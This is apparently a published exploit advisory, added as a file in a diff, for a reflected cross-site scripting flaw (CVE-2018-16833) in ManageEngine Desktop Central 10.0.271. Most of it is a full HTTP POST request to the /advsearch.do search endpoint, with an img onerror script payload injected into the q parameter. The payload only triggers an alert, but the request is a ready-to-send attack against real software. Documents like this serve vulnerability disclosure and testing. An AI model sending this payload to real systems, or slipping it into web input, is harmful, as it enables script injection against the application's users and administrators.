@@ -1,0 +1,31 @@
+# Exploit Title: ManageEngine Desktop Central 10.0.271 - Cross-Site Scripting
+# Date: 2018-09-11 
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.manageengine.com/
+# Hardware Link : https://www.manageengine.com/products/desktop-central/
+# Software : ZOHO Corp ManageEngine Desktop Central 10
+# Product Version: 10.0.271
+# Vulernability Type : Cross-site Scripting
+# Vulenrability : Reflected 
+# CVE : CVE-2018-16833
+
+# Zoho ManageEngine Desktop Central 10.0.271 has XSS via the "Features & Articles" 
+# search field to the /advsearch.do?SUBREQUEST=XMLHTTP URI.
+ 
+# HTTP Request Header :
+
+POST /advsearch.do?SUBREQUEST=XMLHTTP HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
+Accept: */*
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://TARGET/homePage.do?actionToCall=homePageDetails
+X-Requested-With: XMLHttpRequest
+Content-type: application/x-www-form-urlencoded;charset=UTF-8
+X-ZCSRF-TOKEN: =All
+Content-Length: 222
+Cookie: DCJSESSIONID=34B31AEA87E0A617AB23A607C980CC07; DCJSESSIONIDSSO=0738458E311E15CD1E28F27F1DED5388; dc_customerid=All; summarypage=true; DM_SPDA_LST=1536665909495
+Connection: close
+
+q="><img src=x onerror=alert('ismailtasdelen')>&src=sall&stab=Home&page=1&pagelimit=10&searchParamId=901&searchParamName=dm.advsearch.features.articles&id=1536666162979&isTriggerFromMenu=false&actionToCall=getSearchResults
